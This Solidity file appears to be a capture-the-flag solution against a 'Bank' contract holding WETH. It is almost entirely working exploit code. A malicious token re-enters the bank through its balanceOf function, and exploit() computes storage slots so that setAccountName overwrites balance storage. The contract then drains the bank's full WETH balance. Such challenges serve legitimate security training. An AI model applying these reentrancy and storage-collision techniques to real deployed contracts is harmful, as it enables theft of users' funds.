pragma solidity 0.4.24;
import "../challenge11/Demo.sol";

contract BadToken is FakeERC20 {
    mapping(address => uint256) balances;

    uint256 stage = 0;

    function transfer(address dst, uint256 qty) public returns (bool) {
        balances[msg.sender] -= qty;
        balances[dst] += qty;
        return true;
    }

    function transferFrom(
        address src,
        address dst,
        uint256 qty
    ) public returns (bool) {
        balances[src] -= qty;
        balances[dst] += qty;
        return true;
    }

    function approve(address, uint256) public returns (bool) {
        return true;
    }

    function balanceOf(address who) public view returns (uint256) {
        uint256 result = balances[who];

        if (stage == 1) {
            stage = 2;

            bank.depositToken(0, this, 0);
        } else if (stage == 2) {
            stage = 3;

            bank.withdrawToken(0, this, 0);
        }

        return result;
    }

    Bank private bank;
    fakeWETH private weth;

    function exploit(Demo setup) public {
        bank = setup.bank();
        weth = setup.weth();

        bank.depositToken(0, this, 0);

        stage = 1;
        bank.withdrawToken(0, this, 0);

        bytes32 myArraySlot = keccak256(bytes32(address(this)), uint256(2));
        bytes32 myArrayStart = keccak256(myArraySlot);

        uint256 account = 0;
        uint256 slotsNeeded;
        while (true) {
            bytes32 account0Start = bytes32(
                uint256(myArrayStart) + 3 * account
            );
            bytes32 account0Balances = bytes32(uint256(account0Start) + 2);
            bytes32 wethBalance = keccak256(
                bytes32(address(weth)),
                account0Balances
            );

            slotsNeeded = (uint256(-1) - uint256(myArrayStart));
            slotsNeeded++;
            slotsNeeded += uint256(wethBalance);
            if (uint256(slotsNeeded) % 3 == 0) {
                break;
            }
            account++;
        }

        uint256 accountId = uint256(slotsNeeded) / 3;

        bank.setAccountName(
            accountId,
            string(abi.encodePacked(bytes31(uint248(uint256(-1)))))
        );

        bank.withdrawToken(
            account,
            address(weth),
            weth.balanceOf(address(bank))
        );
    }
}

contract FakeWETHSolution {
    constructor(Demo setup) public {
        new BadToken().exploit(setup);
    }
}
